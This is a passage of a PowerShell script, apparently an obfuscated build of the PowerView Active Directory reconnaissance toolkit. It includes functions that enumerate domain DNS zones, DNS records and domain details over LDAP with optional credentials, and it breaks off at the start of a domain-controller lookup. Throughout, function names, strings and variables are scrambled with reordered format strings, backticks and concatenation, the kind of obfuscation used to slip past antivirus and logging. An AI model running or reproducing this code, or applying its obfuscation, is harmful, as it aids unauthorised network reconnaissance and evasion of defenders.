                ("{0}{1}"-f 'Grou','p') {  (&("{2}{3}{0}{1}" -f'r','iAbLe','GeT-','va')  ('ZNf'+'e')  -VALuEON)::"gR`oup" }
                ("{1}{0}"-f'e','Non') {   ${Zn`FE}::"n`onE" }
                ("{1}{0}" -f 'er','Own') {  (  &("{0}{1}"-f 'VaRiAB','lE') ("{1}{0}" -f'E','znF'))."VaL`UE"::"O`wNer" }
                ("{0}{1}"-f'S','acl') {  ( &("{1}{0}" -f 'R','Di') ("{3}{2}{1}{0}"-f 'Nfe','E:Z','ArIAbL','V'))."VA`lue"::"Sa`Cl" }
            }
        }

        if (${PsBoundP`A`R`A`mEterS}[("{0}{2}{1}" -f 'Prope','es','rti')]) {
            
            ${pRo`PE`RTiES`T`oloAD} = ${Pr`ope`RtI`Es}| &("{0}{2}{4}{3}{1}"-f 'F','ct','or','e','Each-Obj') { ${_}.("{0}{1}"-f 'Spli','t').Invoke(',') }
            ${NU`LL} = ${SeA`Rc`hER}."PRoP`e`RtIes`ToLoAd".("{0}{1}" -f'A','ddRange').Invoke((${prOpERT`I`e`stOl`oAd}))
        }

        ${s`EarCHER}
    }
}


function CoNVER`T-D`Nsr`ecoRD {


    [OutputType({"{5}{2}{0}{1}{11}{3}{4}{8}{7}{6}{9}{10}{12}"-f 'a','g','ystem.Man','oma','ti','S','u','n.PSC','o','s','tomObje','ement.Aut','ct'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSItION = 0, MAnDatory = ${tR`Ue}, VAluEFroMpiPeLINEbYprOpeRtYnamE = ${T`RUE})]
        [Byte[]]
        ${Dn`sr`EcoRd}
    )

    BEGIN {
        function gE`T-`Name {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{6}{1}{5}{3}{2}{4}{7}" -f'P','Out','TypeCorrec','t','t','pu','SUse','ly'}, '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${r`Aw}
            )

            [Int]${lE`NGtH} = ${r`Aw}[0]
            [Int]${SeGM`En`Ts} = ${R`AW}[1]
            [Int]${i`N`dEx} =  2
            [String]${n`AME}  = ''

            while (${s`e`gMeNtS}-- -gt 0)
            {
                [Int]${Se`gmE`N`TlE`NgTh} = ${r`Aw}[${I`N`DeX}++]
                while (${s`egm`eN`T`LENGTh}-- -gt 0) {
                    ${N`AME} += [Char]${R`AW}[${i`Ndex}++]
                }
                ${nA`mE} += "."
            }
            ${n`AMe}
        }
    }

    PROCESS {
        
        ${rDA`Tat`yPe} =   ( &("{3}{1}{2}{0}"-f 'LE','t-var','iaB','Ge')  ("d9"+"Ef") )."VAL`UE"::("{0}{1}{2}"-f 'ToU','Int1','6').Invoke(${DN`sR`EcoRD}, 2)
        ${U`p`DaTedAtseRI`AL} =  (  &("{1}{2}{0}{3}"-f '-var','ge','T','IABle') ("{1}{0}" -f'9ef','D') -valU  )::("{0}{1}{2}"-f'T','oU','Int32').Invoke(${D`N`sre`CORd}, 8)

        ${T`TLR`AW} = ${DNsrEc`O`Rd}[12..15]

        
        ${n`ULL} =   ${1d`9r}::("{0}{1}{2}" -f 'Re','v','erse').Invoke(${T`TL`RAw})
        ${t`TL} =   ( &("{0}{2}{1}" -f'g','IABlE','ET-vAR') ("{1}{0}" -f'F','d9e') )."vaL`Ue"::("{1}{0}" -f 'nt32','ToUI').Invoke(${T`TLRaW}, 0)

        ${a`GE} =  (&("{2}{1}{3}{0}"-f'aBlE','AR','GET-V','I')  ("{1}{0}" -f 'eF','D9')  -Valueo )::("{1}{2}{0}"-f 'Int32','T','oU').Invoke(${D`NSREco`Rd}, 20)
        if (${a`GE} -ne 0) {
            ${tim`ESTa`mp} = ((&("{2}{0}{1}"-f't-D','ate','Ge') -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).("{0}{1}{2}"-f'Ad','d','Hours').Invoke(${A`ge})).("{0}{1}" -f'ToSt','ring').Invoke()
        }
        else {
            ${tim`eStA`mp} = ("{0}{1}{2}"-f '[','s','tatic]')
        }

        ${dN`sr`ecordOB`jEcT} = &("{2}{1}{0}"-f 'ect','bj','New-O') ("{2}{1}{0}"-f 't','SObjec','P')

        if (${rd`ATATY`PE} -eq 1) {
            ${Ip} = "{0}.{1}.{2}.{3}" -f ${dN`s`R`ECOrD}[24], ${Dnsre`Co`RD}[25], ${d`NsRECO`RD}[26], ${dnS`R`ECord}[27]
            ${dA`TA} = ${I`P}
            ${DNSRE`cOR`do`BJecT} | &("{0}{2}{1}" -f'A','d-Member','d') ("{1}{0}{2}" -f 'oper','Notepr','ty') ("{0}{1}{2}{3}"-f'Re','co','rdTyp','e') 'A'
        }

        elseif (${rD`AtATy`PE} -eq 2) {
            ${N`SnamE} = &("{1}{0}{2}" -f't-Na','Ge','me') ${dn`SR`ecoRd}[24..${DNsr`ecO`RD}."Le`NGTH"]
            ${d`Ata} = ${ns`Na`Me}
            ${d`NsrecoRDO`BjEct} | &("{0}{2}{1}" -f 'Ad','-Member','d') ("{1}{3}{0}{2}"-f'er','Note','ty','prop') ("{0}{2}{1}" -f'Recor','ype','dT') 'NS'
        }

        elseif (${Rd`AtaT`Y`PE} -eq 5) {
            ${aLI`As} = &("{1}{2}{0}"-f'ame','Ge','t-N') ${Dns`Re`C`ORd}[24..${DN`srEC`oRD}."lE`N`GTH"]
            ${DA`TA} = ${aLI`As}
            ${Dnsre`co`RdO`BJ`eCT} | &("{2}{0}{3}{1}" -f 'd','ember','Ad','-M') ("{0}{3}{1}{2}"-f'No','ro','perty','tep') ("{0}{2}{1}"-f'Reco','pe','rdTy') ("{1}{0}" -f 'AME','CN')
        }

        elseif (${Rda`Ta`Ty`pE} -eq 6) {
            
            ${D`ATA} = $( ${RH`LP}::"tO`B`A`sE`64sTRING"(${DnSrE`co`Rd}[24..${d`NS`ReCord}."L`E`NgtH"]))
            ${dNsREcOr`DObJ`e`ct} | &("{2}{0}{1}"-f 'd-Membe','r','Ad') ("{1}{2}{0}" -f'y','Notep','ropert') ("{0}{1}{2}"-f'R','ecor','dType') 'SOA'
        }

        elseif (${RDataT`Y`PE} -eq 12) {
            ${p`TR} = &("{0}{2}{1}" -f'Ge','Name','t-') ${DnS`R`EcorD}[24..${D`NSR`ECORd}."l`engTH"]
            ${DA`TA} = ${p`TR}
            ${D`N`srE`COrDoBjecT} | &("{1}{0}{3}{2}"-f 'e','Add-M','ber','m') ("{2}{3}{0}{1}"-f'per','ty','Notepr','o') ("{3}{0}{1}{2}" -f'ecordT','y','pe','R') 'PTR'
        }

        elseif (${rdAt`A`TY`PE} -eq 13) {
            
            ${da`TA} = $(  ${RH`lp}::"toBa`sE`64s`T`RINg"(${d`NSRec`oRd}[24..${dns`R`eCORd}."Le`NgTh"]))
            ${DNSR`e`c`ORdoBJE`Ct} | &("{3}{1}{2}{0}"-f 'r','b','e','Add-Mem') ("{3}{1}{2}{0}"-f'ty','epr','oper','Not') ("{1}{2}{0}" -f'ype','Re','cordT') ("{1}{0}"-f'FO','HIN')
        }

        elseif (${r`dAT`ATypE} -eq 15) {
            
            ${D`Ata} = $(  ( &('Gi')  ("V"+"aRiA"+"blE:rh"+"LP")  )."Va`lue"::"tOBAs`e`6`4`STriNG"(${D`N`Sr`Ecord}[24..${d`NsrEc`ORd}."LE`N`gth"]))
            ${DNs`R`EcoRDobJe`ct} | &("{0}{1}{2}"-f 'Add','-Memb','er') ("{0}{1}{2}" -f 'Note','prop','erty') ("{0}{1}{2}" -f 'Record','Ty','pe') 'MX'
        }

        elseif (${Rdata`Ty`pE} -eq 16) {
            [string]${T`Xt}  = ''
            [int]${s`egM`en`TlengTH} = ${DnS`ReC`ord}[24]
            ${Ind`eX} = 25

            while (${s`EgMEn`TLeng`TH}-- -gt 0) {
                ${t`xT} += [char]${Dn`SRECO`Rd}[${iNd`EX}++]
            }

            ${D`ATa} = ${t`xt}
            ${d`NSR`ECor`DOBJEcT} | &("{2}{1}{0}" -f 'r','e','Add-Memb') ("{3}{0}{1}{2}"-f'eproper','t','y','Not') ("{0}{2}{1}" -f'RecordT','pe','y') 'TXT'
        }

        elseif (${rD`ATa`T`ype} -eq 28) {
            
            ${DA`TA} = $( ( &("{1}{0}{2}" -f 'VaRiaBl','GEt-','e')  ("{0}{1}" -f 'Rh','lP')  )."vaL`Ue"::"T`O`BAsE6`4S`TrINg"(${DN`Sre`CORd}[24..${DN`Sr`ECOrD}."l`ENGTh"]))
            ${Dn`sR`eCOrDO`B`ject} | &("{0}{1}{2}"-f'Add-Me','m','ber') ("{1}{2}{0}"-f 'operty','Not','epr') ("{2}{1}{0}"-f 'e','ordTyp','Rec') ("{1}{0}" -f 'AAA','A')
        }

        elseif (${RdAT`At`YpE} -eq 33) {
            
            ${d`ATA} = $( ${R`HLp}::"tO`BAsE64STrI`Ng"(${DN`sReCO`Rd}[24..${DNsr`e`CoRD}."LE`N`Gth"]))
            ${DnS`REcor`DObj`E`cT} | &("{3}{1}{2}{0}"-f 'ber','M','em','Add-') ("{0}{2}{1}" -f'Not','perty','epro') ("{2}{1}{0}" -f'Type','cord','Re') 'SRV'
        }

        else {
            ${D`Ata} = $( ( &("{1}{2}{3}{0}"-f 'ble','GEt-Var','i','a')  ("{0}{1}"-f'rH','lP')  )."va`LuE"::"TobaSe6`4`StR`InG"(${d`Ns`RE`cOrd}[24..${dNsr`ec`ORd}."LENG`TH"]))
            ${DN`s`Reco`Rd`obJECt} | &("{1}{2}{0}"-f 'ber','A','dd-Mem') ("{3}{0}{1}{2}"-f'teproper','t','y','No') ("{1}{2}{3}{0}"-f'e','Re','cordT','yp') ("{0}{2}{1}"-f 'U','N','NKNOW')
        }

        ${dN`S`RECoRd`o`BJECt} | &("{2}{1}{0}"-f'Member','d-','Ad') ("{0}{2}{1}{3}" -f'N','te','o','property') ("{3}{1}{2}{0}" -f'ial','dat','edAtSer','Up') ${UP`d`ATeDA`TsEr`ial}
        ${Dn`srecOrdoB`JEct} | &("{1}{2}{0}" -f 'r','Ad','d-Membe') ("{2}{0}{1}" -f 'op','erty','Notepr') 'TTL' ${t`TL}
        ${dNS`R`E`c`oRdobJeCt} | &("{0}{2}{1}" -f'A','Member','dd-') ("{0}{2}{1}" -f'No','rty','teprope') 'Age' ${A`gE}
        ${D`Ns`RE`cO`RdOBJECT} | &("{2}{0}{1}" -f 'dd-Mem','ber','A') ("{2}{1}{0}" -f 'rty','eprope','Not') ("{0}{1}{2}" -f'Ti','meSt','amp') ${tIM`est`AMP}
        ${dnSrE`co`RdO`BjeCt} | &("{2}{0}{1}" -f 'e','mber','Add-M') ("{2}{1}{3}{0}" -f 'ty','tepr','No','oper') ("{1}{0}" -f 'a','Dat') ${DA`Ta}
        ${dNs`ReC`o`R`dObjEct}
    }
}


function gET-`dOMaindn`S`Z`one {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{3}{1}"-f 'P','rocess','SSho','uldP'}, '')]
    [OutputType({"{2}{1}{3}{0}"-f'one','werView.','Po','DNSZ'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosiTIOn = 0, ValueFROmpiPeliNE = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`mAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}{3}"-f'ro','Domai','nCont','ller'})]
        [String]
        ${S`erVeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pRop`ErTi`Es},

        [ValidateRange(1, 10000)]
        [Int]
        ${R`E`SU`lT`paGesIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${sERVeRT`imel`I`mIT},

        [Alias({"{1}{0}{2}" -f 'turn','Re','One'})]
        [Switch]
        ${fI`N`DonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRED`enT`ial} =  (&("{0}{1}"-f 'i','tEm') ("V"+"ArIa"+"blE:Jh3xO"+"6") )."V`Alue"::"EM`pTy"
    )

    PROCESS {
        ${Se`Arc`HerA`RgUmENTS} = @{
            ("{0}{1}{2}"-f 'L','DAP','Filter') = (("{2}{1}{4}{5}{3}{0}"-f'e)','la','(objectC','n','ss=dns','Zo'))
        }
        if (${PSboUndP`ARa`M`eTE`Rs}[("{0}{1}{2}"-f 'Dom','a','in')]) { ${S`earCh`ERaRGUM`en`TS}[("{1}{2}{0}"-f'in','D','oma')] = ${DOm`Ain} }
        if (${p`SboUND`PaR`Ame`TErs}[("{0}{2}{1}"-f 'Se','er','rv')]) { ${S`E`AR`CHerA`RGU`MEnTs}[("{1}{0}" -f 'erver','S')] = ${S`Er`VER} }
        if (${P`SBoUndpA`R`AmEte`RS}[("{1}{2}{0}"-f'rties','P','rope')]) { ${s`E`ARcheR`ARg`UmENTs}[("{1}{3}{2}{0}" -f'es','Pr','erti','op')] = ${prO`pE`RTiES} }
        if (${ps`B`oUnd`p`ArA`METERS}[("{2}{1}{0}" -f'geSize','ultPa','Res')]) { ${seArc`HeRaRGU`mEn`TS}[("{0}{2}{1}"-f 'ResultPageS','e','iz')] = ${rE`Su`l`Tpa`GEsIze} }
        if (${PSbo`U`N`dPa`RaMe`TeRS}[("{3}{0}{1}{4}{2}" -f'e','rv','Limit','S','erTime')]) { ${sEaRc`HERAr`gu`me`Nts}[("{4}{0}{1}{3}{2}" -f 'erverTi','m','Limit','e','S')] = ${sEr`VErT`imeLIM`it} }
        if (${PsbOund`PAr`AMET`ERs}[("{1}{0}{2}" -f 'nt','Crede','ial')]) { ${SE`A`RCHe`R`ARgUMENts}[("{2}{0}{1}"-f 'd','ential','Cre')] = ${C`RE`denT`Ial} }
        ${dN`s`S`earCher1} = &("{1}{0}{2}{3}"-f 'ainSearc','Get-Dom','h','er') @SearcherArguments

        if (${D`NSSEAR`cHE`R1}) {
            if (${P`S`Bou`NDp`ARametERS}[("{1}{0}"-f 'One','Find')]) { ${Re`sUlTs} = ${DnS`seAR`CHEr1}.("{1}{0}" -f 'ne','FindO').Invoke()  }
            else { ${r`eSULtS} = ${dNS`S`EaRcher1}.("{1}{0}{2}"-f'l','FindA','l').Invoke() }
            ${RESU`l`Ts} | &("{2}{3}{1}{0}"-f't','bjec','Whe','re-O') {${_}} | &("{4}{3}{1}{0}{2}"-f 'Obj','rEach-','ect','o','F') {
                ${O`Ut} = &("{5}{6}{1}{3}{2}{4}{0}"-f 'y','nver','APP','t-LD','ropert','C','o') -Properties ${_}."Prope`R`Ties"
                ${O`UT} | &("{1}{3}{0}{2}"-f'd-Mem','A','ber','d') ("{0}{2}{3}{1}"-f'Note','y','Pro','pert') ("{2}{0}{1}"-f'oneN','ame','Z') ${o`UT}."N`AmE"
                ${O`UT}."PSob`jE`Ct"."TYpEn`A`m`ES".("{1}{0}" -f 't','Inser').Invoke(0, ("{5}{1}{3}{2}{4}{0}" -f'Zone','we','.DN','rView','S','Po'))
                ${o`UT}
            }

            if (${re`SuL`Ts}) {
                try { ${re`S`UlTs}.("{0}{1}" -f 'd','ispose').Invoke() }
                catch {
                    &("{2}{1}{3}{0}"-f 'bose','e-','Writ','Ver') ('[Ge'+'t-DomainDFS'+'Share]'+' '+'Er'+'ror'+' '+'dispo'+'s'+'ing '+'o'+'f '+'the'+' '+'R'+'es'+'ults '+'ob'+'j'+'ect: '+"$_")
                }
            }
            ${dNsSea`R`ChE`R1}.("{0}{1}"-f'dispo','se').Invoke()
        }

        ${sEaRchE`RaR`guME`NtS}[("{1}{0}{2}{3}"-f 'archB','Se','asePref','ix')] = ("{4}{5}{9}{6}{10}{0}{1}{2}{7}{8}{3}" -f 'tD','NS,D','C=Domai','es','CN=','M','so','nDnsZ','on','icro','f')
        ${Dns`SeaRCH`E`R2} = &("{3}{2}{4}{1}{0}" -f'r','che','inS','Get-Doma','ear') @SearcherArguments

        if (${dnS`se`ARc`HEr2}) {
            try {
                if (${psBo`Un`DParaM`eTe`RS}[("{1}{0}" -f 'indOne','F')]) { ${Re`s`UlTS} = ${DNsse`ARC`heR2}.("{0}{1}" -f'Fi','ndOne').Invoke() }
                else { ${R`eSU`ltS} = ${dNss`e`A`Rch`Er2}.("{0}{1}"-f 'F','indAll').Invoke() }
                ${rES`UltS} | &("{2}{0}{1}" -f'b','ject','Where-O') {${_}} | &("{1}{0}{2}{3}" -f'Eac','For','h-Obje','ct') {
                    ${O`UT} = &("{3}{4}{2}{5}{0}{1}" -f 'rt','y','-LDAPP','Conv','ert','rope') -Properties ${_}."p`RoPEr`TieS"
                    ${O`UT} | &("{1}{2}{0}" -f'mber','Add','-Me') ("{0}{2}{1}" -f 'N','y','otePropert') ("{2}{1}{0}" -f 'Name','ne','Zo') ${O`UT}."n`AmE"
                    ${O`UT}."pSo`B`ject"."tyPe`Nam`eS".("{1}{0}"-f't','Inser').Invoke(0, ("{1}{0}{4}{3}{2}"-f'rVi','Powe','ne','SZo','ew.DN'))
                    ${o`UT}
                }
                if (${r`Esu`Lts}) {
                    try { ${rE`SULTs}.("{2}{0}{1}"-f 'is','pose','d').Invoke() }
                    catch {
                        &("{1}{2}{3}{0}"-f 'rbose','Write','-','Ve') ('[G'+'e'+'t-D'+'omainDN'+'SZo'+'ne]'+' '+'Er'+'ror '+'d'+'ispo'+'sing '+'o'+'f '+'th'+'e '+'R'+'esults'+' '+'obj'+'e'+'ct: '+"$_")
                    }
                }
            }
            catch {
                &("{2}{1}{0}"-f'rbose','e','Write-V') ((("{4}{11}{13}{7}{12}{0}{9}{5}{6}{3}{10}{8}{1}{2}" -f'ic','e','sDHp','NS,DC=Domai','[Get-DomainDNSZone] Erro','o','softD','HpC','nsZon','r','nD','r','N=M',' accessing D'))."rE`pLaCE"(([CHaR]68+[CHaR]72+[CHaR]112),[StriNg][CHaR]39))
            }
            ${dn`ssea`Rch`ER2}.("{1}{0}" -f 'ose','disp').Invoke()
        }
    }
}


function G`et-`d`om`AiNDnsr`eCo`RD {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}" -f'ldPr','PSShou','oce','ss'}, '')]
    [OutputType({"{4}{2}{1}{3}{0}" -f'rd','rView.DN','we','SReco','Po'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSiTIon = 0,  MAndatory = ${t`RuE}, VALuefromPiPeLIne = ${T`RuE}, vaLuEFRoMpiPeLInEbyPROpERtynAMe = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Z`On`eName},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`Ma`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{4}{2}" -f'omainContr','ol','r','D','le'})]
        [String]
        ${serv`Er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRO`PeRT`i`es} = ("{8}{7}{4}{6}{0}{5}{1}{2}{3}" -f 'nsrecord,whenc','en','chan','ged','nam','reated,wh','e,d','uished','name,disting'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reS`ULTp`AgES`izE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SE`Rv`eRt`I`M`ELImIt},

        [Alias({"{1}{0}"-f 'ne','ReturnO'})]
        [Switch]
        ${fIn`DOne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`EDeN`T`iAL} =   (  &("{2}{3}{0}{1}" -f 'aRI','ABlE','geT','-v') ("{0}{1}" -f'Jh3x','o6'))."VA`Lue"::"EM`pty"
    )

    PROCESS {
        ${SEAr`CHE`RArg`U`mEnTs} = @{
            ("{0}{1}{2}"-f 'LDAPF','i','lter') = (("{3}{4}{1}{2}{0}" -f'Class=dnsNode)','e','ct','(','obj'))
            ("{4}{1}{3}{5}{0}{2}" -f'Prefi','earch','x','Ba','S','se') = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if (${PSB`OU`ND`PA`RAMeTERS}[("{1}{0}" -f 'omain','D')]) { ${SeaRch`Era`Rgu`m`eNTS}[("{0}{1}"-f 'D','omain')] = ${do`mA`iN} }
        if (${pSBO`UND`p`Ar`A`metErs}[("{2}{1}{0}"-f'r','erve','S')]) { ${S`e`ARcherArgUm`ents}[("{2}{0}{1}"-f'rv','er','Se')] = ${S`e`RveR} }
        if (${PsB`OuNdpA`RAm`etERS}[("{3}{1}{2}{0}" -f 'rties','p','e','Pro')]) { ${S`Ea`Rc`heR`ARGUmE`NTs}[("{2}{0}{1}"-f'rti','es','Prope')] = ${ProPE`R`Ties} }
        if (${psB`OU`NDPaRaM`eteRs}[("{0}{1}{2}"-f'Result','PageS','ize')]) { ${Se`Ar`c`HERArGu`MENTS}[("{3}{2}{0}{1}"-f 'Si','ze','ultPage','Res')] = ${re`SultP`AgESiZe} }
        if (${P`S`BOuNdp`AR`AmEtErs}[("{0}{4}{3}{2}{1}" -f 'Ser','t','imi','L','verTime')]) { ${SeArC`hE`RaRGUM`ENtS}[("{3}{0}{2}{1}" -f 'erverTime','imit','L','S')] = ${sEr`Ve`RTiM`EL`I`miT} }
        if (${pSbo`UNDp`AramE`TERs}[("{2}{0}{1}"-f'en','tial','Cred')]) { ${SEARCheR`ARg`U`mE`Nts}[("{0}{2}{1}"-f 'Creden','l','tia')] = ${c`RedeNti`Al} }
        ${dNS`sE`ArCH`ER} = &("{3}{4}{2}{5}{1}{0}"-f 'er','arch','t-Domain','G','e','Se') @SearcherArguments

        if (${dn`Ss`EA`RChEr}) {
            if (${PS`BOU`NdPar`Ame`TErs}[("{2}{1}{0}" -f'One','nd','Fi')]) { ${re`Su`ltS} = ${dNsS`eARc`heR}.("{0}{2}{1}"-f 'Fi','ne','ndO').Invoke() }
            else { ${RE`SuLtS} = ${dNSS`eaRC`HER}.("{0}{1}{2}" -f'F','indAl','l').Invoke() }
            ${reS`ULtS} | &("{0}{2}{1}"-f 'Where-O','t','bjec') {${_}} | &("{0}{1}{2}{4}{3}" -f 'ForEa','ch','-Ob','t','jec') {
                try {
                    ${o`UT} = &("{0}{3}{4}{6}{1}{2}{5}"-f 'Co','PP','roper','nver','t-L','ty','DA') -Properties ${_}."propE`R`T`iES" | &("{3}{2}{0}{1}"-f'c','t','-Obje','Select') ("{1}{0}"-f'ame','n'),("{4}{3}{1}{2}{0}"-f'ame','uishe','dn','isting','d'),("{2}{0}{1}"-f 'nsre','cord','d'),("{2}{0}{1}" -f'reat','ed','whenc'),("{2}{1}{0}" -f'ged','han','whenc')
                    ${o`UT} | &("{2}{1}{0}" -f'mber','d-Me','Ad') ("{1}{0}{2}" -f'pe','NotePro','rty') ("{1}{0}"-f 'e','ZoneNam') ${Z`onEnA`mE}

                    
                    if (${o`UT}."dNSRe`c`orD" -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        
                        ${r`ECO`RD} = &("{3}{2}{4}{0}{1}{5}"-f 'vert-D','NSRecor','o','C','n','d') -DNSRecord ${O`UT}."dNsRE`CO`RD"[0]
                    }
                    else {
                        ${r`ecoRd} = &("{1}{5}{2}{0}{3}{4}" -f'eco','Con','DNSR','r','d','vert-') -DNSRecord ${O`Ut}."Dn`srECorD"
                    }

                    if (${r`eco`Rd}) {
                        ${rEcO`RD}."PsOBj`E`CT"."p`ROp`e`RTiES" | &("{0}{1}{3}{2}" -f'ForEa','ch','bject','-O') {
                            ${o`UT} | &("{1}{2}{0}"-f'Member','A','dd-') ("{1}{0}{2}"-f'Pro','Note','perty') ${_}."n`Ame" ${_}."vA`Lue"
                        }
                    }

                    ${o`UT}."P`sobJE`ct"."tYpen`Am`ES".("{1}{2}{0}"-f 't','I','nser').Invoke(0, ("{1}{2}{5}{3}{4}{0}"-f'.DNSRecord','P','ow','r','View','e'))
                    ${o`Ut}
                }
                catch {
                    &("{3}{4}{0}{1}{2}"-f '-Wa','rnin','g','Wr','ite') ('[Ge'+'t-Do'+'ma'+'inDNS'+'Re'+'cord'+'] '+'Er'+'ror: '+"$_")
                    ${O`UT}
                }
            }

            if (${R`EsULTS}) {
                try { ${r`ESUL`Ts}.("{1}{0}{2}" -f'sp','di','ose').Invoke() }
                catch {
                    &("{2}{3}{4}{1}{0}" -f 'se','rbo','W','ri','te-Ve') ('[Get-'+'Doma'+'inDNS'+'Rec'+'ord] '+'Error'+' '+'di'+'sposi'+'ng '+'of'+' '+'t'+'he '+'Re'+'sults'+' '+'o'+'bj'+'ect: '+"$_")
                }
            }
            ${DNSs`Earc`hEr}.("{2}{1}{0}" -f 'pose','is','d').Invoke()
        }
    }
}


function Ge`T`-d`oMaiN {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(PoSitIOn = 0, vaLUefrOmPipeLinE = ${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`mAiN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cre`d`ENTI`Al} =  (&("{1}{2}{0}" -f'Le','get-VArI','ab') ('jh'+'3xo6') )."vaL`Ue"::"e`mpty"
    )

    PROCESS {
        if (${Psbo`Un`DPa`RAm`Ete`Rs}[("{0}{2}{1}" -f'C','al','redenti')]) {

            &("{2}{1}{0}"-f '-Verbose','ite','Wr') ("{11}{8}{0}{14}{12}{6}{10}{13}{2}{5}{3}{9}{7}{1}{4}"-f'main] Usin','t-Dom','e c','tials','ain','reden','te','e','et-Do',' for G','rn','[G',' al','at','g')

            if (${PSB`O`UndpA`RaMeTeRS}[("{1}{0}" -f'n','Domai')]) {
                ${TA`Rg`e`TDOM`AIn} = ${dOM`Ain}
            }
            else {
                
                ${taRG`ET`DoMAin} = ${cRED`En`TiAl}.("{3}{1}{4}{0}{2}" -f'rede','etNetwo','ntial','G','rkC').Invoke()."D`omaiN"
                &("{2}{1}{3}{0}"-f'Verbose','e','Writ','-') ('[Get'+'-Do'+'ma'+'in'+'] '+'Extrac'+'t'+'ed '+'do'+'main '+"'$TargetDomain' "+'f'+'rom '+'-C'+'reden'+'ti'+'al')
            }

            ${DoMainC`oN`T`eXt} = &("{2}{0}{1}"-f 'w-O','bject','Ne') ("{16}{2}{9}{3}{13}{6}{11}{8}{15}{14}{4}{10}{1}{0}{5}{7}{12}"-f'.Direc','ry','ys','.','iv','toryC','ctor','o','Serv','tem','eDirecto','y','ntext','Dire','ces.Act','i','S')(("{0}{1}"-f 'Doma','in'), ${tA`RG`E`TDoMAIN}, ${CREdE`NT`I`AL}."U`sern`AmE", ${CrEDen`TI`AL}.("{3}{0}{1}{2}" -f 'rkCredent','i','al','GetNetwo').Invoke()."pAs`S`worD")

            try {
                 ( &("{0}{1}"-f 'G','ci')  ('vA'+'RiABLE:O'+'lWPQv')  )."V`AlUe"::("{2}{0}{1}"-f 'et','Domain','G').Invoke(${Domai`NcON`Te`XT})
            }
            catch {
                &("{2}{0}{1}" -f'-','Verbose','Write') ('[Ge'+'t-Domai'+'n]'+' '+'T'+'he '+'spe'+'cifie'+'d '+'dom'+'ain '+"'$TargetDomain' "+'d'+'oes '+'not'+' '+'e'+'xist'+', '+'co'+'uld '+'not'+' '+'b'+'e '+'contac'+'ted'+', '+'t'+'here'+' '+('is'+'n'+'3'+'uJt ')."Rep`lAcE"('3uJ',[sTrinG][Char]39)+'an'+' '+'exist'+'ing'+' '+'trus'+'t'+', '+'o'+'r '+'th'+'e '+'s'+'pecifie'+'d'+' '+'c'+'redentials'+' '+'are'+' '+'inva'+'li'+'d: '+"$_")
            }
        }
        elseif (${PSb`o`Un`DPAra`meTERs}[("{1}{0}" -f 'ain','Dom')]) {
            ${do`MAin`cOntEXT} = &("{1}{2}{0}" -f'bject','New-','O') ("{8}{6}{7}{4}{11}{0}{3}{13}{12}{9}{2}{10}{1}{5}"-f'ryServices.Acti','te','r','veDi','r','xt','ystem.D','i','S','Di','ectoryCon','ecto','ory.','rect')(("{0}{1}"-f'Dom','ain'), ${dOM`A`iN})
            try {
                  (  &("{2}{1}{0}"-f'iTEm','ild','Ch') ("{1}{2}{3}{0}"-f 'V','va','riaBle:o','LWpQ'))."v`AlUE"::("{0}{1}{2}"-f 'Ge','tDo','main').Invoke(${do`ma`i`NcoNt`EXt})
            }
            catch {
                &("{1}{2}{0}"-f 'rbose','Write','-Ve') ('[G'+'et-D'+'omain]'+' '+'T'+'he '+'sp'+'ecifi'+'ed '+'d'+'omai'+'n '+"'$Domain' "+'d'+'oes '+'n'+'ot '+'exist,'+' '+'could'+' '+'no'+'t '+'be'+' '+'contact'+'ed'+', '+'or'+' '+'th'+'ere '+('isn3X'+'ot'+' ')."rEPLA`Ce"(([CHAr]51+[CHAr]88+[CHAr]111),[sTRING][CHAr]39)+'a'+'n '+'ex'+'istin'+'g '+'tr'+'ust '+': '+"$_")
            }
        }
        else {
            try {
                 ${oL`wpqV}::("{3}{0}{1}{2}" -f 'entDo','mai','n','GetCurr').Invoke()
            }
            catch {
                &("{0}{2}{1}" -f 'Write-Ve','e','rbos') ('[Get'+'-'+'Domai'+'n'+'] '+'Erro'+'r '+'r'+'et'+'rieving '+'the'+' '+'c'+'ur'+'rent '+'doma'+'in'+': '+"$_")
            }
        }
    }
}


function GeT`-DOmAINCO`Nt`Roller {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{4}{1}{3}"-f'SS','ouldProces','P','s','h'}, '')]
    [OutputType({"{2}{1}{5}{4}{3}{0}"-f'r','werV','Po','pute','om','iew.C'})]
    [OutputType({"{1}{0}{10}{11}{3}{6}{13}{8}{2}{12}{5}{7}{9}{4}" -f 'i','System.D','cto','ryServices.','r','.Domain','Activ','Controll','ire','e','rec','to','ry','eD'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSitIon = 0, vAlUefRompIPelinE = ${tr`UE})]
        [String]
        ${do`main},

        [ValidateNotNullOrEmpty()]
